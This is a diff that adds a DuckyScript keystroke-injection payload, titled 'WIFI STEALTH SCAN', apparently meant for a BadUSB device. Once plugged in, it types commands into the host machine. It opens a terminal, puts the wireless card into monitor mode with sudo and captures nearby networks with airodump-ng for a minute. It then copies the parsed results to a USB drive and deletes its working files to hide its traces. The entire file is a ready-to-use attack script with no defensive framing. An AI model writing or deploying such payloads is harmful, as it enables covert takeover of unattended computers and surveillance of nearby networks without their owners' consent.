@@ -1,0 +1,62 @@
+# ============================================
+# WIFI STEALTH SCAN - Passive Reconnaissance
+# ============================================
+# Purpose: Passive WiFi scanning without transmitting
+# Target: Any WiFi-enabled device
+# Time: 60 seconds
+# Author: D3n14l0f53rv1c3
+# ============================================
+
+DELAY 2000
+
+# Open terminal
+GUI r
+DELAY 500
+STRING xterm
+ENTER
+DELAY 1000
+
+# Create output directory
+STRING mkdir -p /tmp/wifi_recon
+ENTER
+DELAY 200
+
+# Set monitor mode (passive)
+STRING sudo ip link set wlan0 down 2>/dev/null
+ENTER
+DELAY 200
+STRING sudo iw dev wlan0 set type monitor
+ENTER
+DELAY 200
+STRING sudo ip link set wlan0 up
+ENTER
+DELAY 500
+
+# Start passive capture
+STRING sudo airodump-ng wlan0 -w /tmp/wifi_recon/scan --output-format csv 2>/dev/null &
+ENTER
+DELAY 60000
+
+# Stop capture
+STRING sudo pkill airodump-ng
+ENTER
+DELAY 200
+
+# Parse results
+STRING echo "=== WIFI NETWORKS FOUND ===" > /tmp/wifi_recon/results.txt
+ENTER
+DELAY 100
+STRING grep -oP "([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2},.*" /tmp/wifi_recon/scan-01.csv | head -50 >> /tmp/wifi_recon/results.txt
+ENTER
+DELAY 200
+
+# Copy to USB if available
+STRING if [ -d /media/usb ]; then cp /tmp/wifi_recon/results.txt /media/usb/; fi
+ENTER
+DELAY 200
+
+# Clean up
+STRING rm -rf /tmp/wifi_recon
+ENTER
+STRING exit
+ENTER
